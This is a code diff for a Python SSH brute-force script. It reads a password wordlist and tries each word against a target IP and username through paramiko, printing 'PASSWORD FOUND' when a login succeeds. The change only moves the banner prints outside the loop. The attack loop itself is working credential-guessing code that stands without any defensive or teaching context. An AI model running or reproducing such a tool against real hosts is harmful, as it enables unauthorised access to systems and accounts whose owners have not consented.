@@ -23,11 +23,11 @@ def brute(ip, user, passwd):
     client = p.SSHClient()
     client.set_missing_host_key_policy(p.AutoAddPolicy())
     with open(passwd, "r") as file:
+        print(c("WORDLIST LOADED SUCCESSFULLY :", "red"), c(passwd, "green"))
+        time.sleep(1.5)
+        print(c("NUMBER OF TRIES AHEAD :", "red"), c(counts, "green"))
         for line in file.readlines():
             for word in line.split():
-                print(c("WORDLIST LOADED SUCCESSFULLY :", "red"), c(passwd, "green"))
-                time.sleep(1.5)
-                print(c("NUMBER OF TRIES AHEAD :", "red"), c(counts, "green"))
                 try:
                     client.connect(hostname=ip, username=user, password=word, timeout=3)
                     print(c("PASSWORD FOUND :", "red"), c(d.now().strftime("(%d/%m/%Y - %H:%M:%S)"), "blue"))
